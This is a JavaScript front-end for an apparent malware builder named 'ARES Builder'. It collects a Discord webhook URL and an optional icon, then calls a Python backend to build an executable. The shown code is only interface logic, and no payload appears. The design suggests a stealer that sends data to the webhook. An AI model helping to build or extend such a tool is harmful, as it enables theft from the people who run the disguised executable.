let isBuilding = false;
let selectedIconPath = null;

const webhookInput = document.getElementById('webhookUrl');
const useIconCheckbox = document.getElementById('useIcon');
const selectIconBtn = document.getElementById('selectIconBtn');
const selectedIconDiv = document.getElementById('selectedIcon');
const buildBtn = document.getElementById('buildBtn');
const consoleOutput = document.getElementById('consoleOutput');
const clearConsoleBtn = document.getElementById('clearConsole');
const statusText = document.getElementById('statusText');
const statusIndicator = document.querySelector('.status-indicator');

document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    updateBuildButtonState();
});

function initializeEventListeners() {

    webhookInput.addEventListener('input', validateWebhookInput);

    useIconCheckbox.addEventListener('change', function() {
        selectIconBtn.disabled = !this.checked;
        if (!this.checked) {
            clearSelectedIcon();
        }
        updateBuildButtonState();
    });

    selectIconBtn.addEventListener('click', selectIcon);

    buildBtn.addEventListener('click', startBuild);

    clearConsoleBtn.addEventListener('click', clearConsole);

    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('remove-icon')) {
            clearSelectedIcon();
            useIconCheckbox.checked = false;
            selectIconBtn.disabled = true;
            updateBuildButtonState();
        }
    });
}

function validateWebhookInput() {
    const value = webhookInput.value.trim();
    const isValid = value.length > 0 && value.includes('discord.com/api/webhooks/');

    webhookInput.style.borderColor = isValid ? 'var(--success)' : 
                                   value.length > 0 ? 'var(--danger)' : 'var(--border)';

    updateBuildButtonState();
}

function selectIcon() {
    if (isBuilding) return;

    addConsoleOutput('[ARES] 📁 Opening file dialog...', 'info');
    eel.select_icon();
}

eel.expose(icon_selected);
function icon_selected(filename) {
    selectedIconPath = filename;
    showSelectedIcon(filename);
    addConsoleOutput(`[ARES] 🎨 Icon selected: ${filename}`, 'success');
    updateBuildButtonState();
}

function showSelectedIcon(filename) {
    const iconName = selectedIconDiv.querySelector('.icon-name');
    iconName.textContent = filename;
    selectedIconDiv.style.display = 'flex';
}

function clearSelectedIcon() {
    selectedIconPath = null;
    selectedIconDiv.style.display = 'none';
}

function updateBuildButtonState() {
    const webhookValid = webhookInput.value.trim().length > 0 && 
                        webhookInput.value.includes('discord.com/api/webhooks/');
    const iconValid = !useIconCheckbox.checked || selectedIconPath;

    buildBtn.disabled = isBuilding || !webhookValid || !iconValid;
}

async function startBuild() {
    if (isBuilding) return;

    const webhookUrl = webhookInput.value.trim();
    const useIcon = useIconCheckbox.checked;

    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks/')) {
        addConsoleOutput('[ARES] ❌ Invalid webhook URL', 'error');
        return;
    }

    if (useIcon && !selectedIconPath) {
        addConsoleOutput('[ARES] ❌ Please select an icon file', 'error');
        return;
    }

    isBuilding = true;
    buildBtn.classList.add('loading');
    buildBtn.disabled = true;
    updateStatus('Building...', 'building');

    addConsoleOutput('[ARES] 🚀 Starting build process...', 'info');

    try {
        const result = await eel.configure_webhook_and_build(webhookUrl, useIcon)();

        if (result.success) {
            addConsoleOutput('[ARES] 🎉 Build completed successfully!', 'success');
            updateStatus('Build Successful', 'success');
        } else {
            addConsoleOutput(`[ARES] ❌ Build failed: ${result.message}`, 'error');
            updateStatus('Build Failed', 'error');
        }
    } catch (error) {
        addConsoleOutput(`[ARES] ❌ Unexpected error: ${error}`, 'error');
        updateStatus('Error', 'error');
    } finally {
        isBuilding = false;
        buildBtn.classList.remove('loading');
        updateBuildButtonState();
    }
}

eel.expose(add_console_output);
function add_console_output(message, type = 'info') {
    addConsoleOutput(message, type);
}

eel.expose(update_status);
function update_status(status, type = 'ready') {
    updateStatus(status, type);
}

function addConsoleOutput(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: false, 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    });

    const line = document.createElement('div');
    line.className = `console-line ${type}`;
    line.innerHTML = `
        <span class="timestamp">[${timestamp}]</span>
        <span class="message">${message}</span>
    `;

    consoleOutput.appendChild(line);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;

    const lines = consoleOutput.querySelectorAll('.console-line');
    if (lines.length > 100) {
        lines[0].remove();
    }
}

function clearConsole() {
    consoleOutput.innerHTML = '';
    addConsoleOutput('[ARES] Console cleared. ARES Builder ready!', 'welcome');
}

function updateStatus(status, type = 'ready') {
    statusText.textContent = status;
    statusIndicator.className = `status-indicator ${type}`;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function setupWindowControls() {
    const minimizeBtn = document.querySelector('.control-btn.minimize');
    const maximizeBtn = document.querySelector('.control-btn.maximize');
    const closeBtn = document.querySelector('.control-btn.close');

    if (minimizeBtn) {
        minimizeBtn.addEventListener('click', () => {
            console.log('Minimize clicked');
        });
    }

    if (maximizeBtn) {
        maximizeBtn.addEventListener('click', () => {
            console.log('Maximize clicked');
        });
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            window.close();
        });
    }
}

document.addEventListener('click', function(e) {

    if (e.target.tagName === 'BUTTON' && !e.target.disabled) {
        createRippleEffect(e.target, e);
    }
});

function createRippleEffect(element, event) {
    const ripple = document.createElement('div');
    const rect = element.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    const x = event.clientX - rect.left - size / 2;
    const y = event.clientY - rect.top - size / 2;

    ripple.style.cssText = `
        position: absolute;
        width: ${size}px;
        height: ${size}px;
        left: ${x}px;
        top: ${y}px;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 50%;
        transform: scale(0);
        animation: ripple 0.6s ease-out;
        pointer-events: none;
        z-index: 1;
    `;

    element.style.position = 'relative';
    element.style.overflow = 'hidden';
    element.appendChild(ripple);

    setTimeout(() => ripple.remove(), 600);
}

const style = document.createElement('style');
style.textContent = `
    @keyframes ripple {
        to {
            transform: scale(2);
            opacity: 0;
        }
    }
`;
document.head.appendChild(style);

setupWindowControls();